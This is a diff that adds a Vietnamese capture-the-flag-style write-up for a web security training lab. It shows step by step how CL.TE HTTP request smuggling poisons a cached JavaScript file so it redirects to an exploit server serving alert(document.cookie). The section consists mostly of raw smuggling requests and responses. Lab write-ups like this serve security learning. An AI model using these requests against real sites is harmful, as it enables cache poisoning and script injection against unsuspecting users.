@@ -573,7 +573,52 @@ Sau khi submit hai lần, ta nhận được response `Backend only accepts meth
 Thay đổi smuggled request thành `GET /admin`, ta có thể truy cập admin panel. Sau đó đặt smuggled request là `GET /admin/delete?username=carlos`, kết quả bài lab được giải thành công.
 
 # 16. Exploiting HTTP request smuggling to perform web cache poisoning
+Cấu hỉnh request sau:
+```
+POST / HTTP/1.1
+Host: 0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net
+Content-Length: 130
+Transfer-Encoding: chunked
 
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+Sau khi submit hai lần, ta được response `HTTP/1.1 404 Not Found`, là dấu hiệu cho thấy website có lỗ hổng CL.TE.
+
+Nhận thấy trong website có chức năng "Next post", khi gửi request `GET /post/next?postId=4 HTTP/1.1` ta được response:
+```
+HTTP/2 302 Found
+Location: https://0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net/post?postId=5
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+Như vậy, website có sử dụng absolute URL trong header Location. Ta cấu hình request sau:
+```
+POST / HTTP/1.1
+Host: 0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net
+Content-Length: 128
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=4 HTTP/1.1
+Host: 0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net
+Content-Length: 10
+
+x=
+```
+Response trả về với header `Location: https://0a2a006e040be6bdc2ffd4880018004a.web-security-academy.net/post?postId=5`. Như vậy, ta có thể thay đổi Host header để tạo response redirect về exploit server. Đồng thời, nhận thấy với request `/resources/js/tracking.js` thì có cache được sử dụng.
+
+Vào exploit server, cấu hình javascript với content `alert(document.cookie)` rồi để Path là `/post?postId=5`. Ta tiến hành như sau:
+1) Gửi request trên khiến cho smuggled request (request tiếp theo) sẽ trả về response redirect tới exploit server
+2) Đợi đến khi cache hết hạn rồi gửi request `/resources/js/tracking.js`, request header sẽ trở thành body của smuggled request và khiến response là response redirect trong bước 1. Response này sẽ được lưu trong cache
+3) Khi user load file javascript tracking.js, response trong cache sẽ được trả về và redirect tới exploit server.
+
+![image](https://user-images.githubusercontent.com/103978452/226513945-a8d1dce6-254e-41a6-98f2-3551274d399d.png)
+
+Làm các bước như trên, kết quả thành công.
 # 17. Exploiting HTTP request smuggling to perform web cache deception
 
 # 18. Bypassing access controls via HTTP/2 request tunnelling
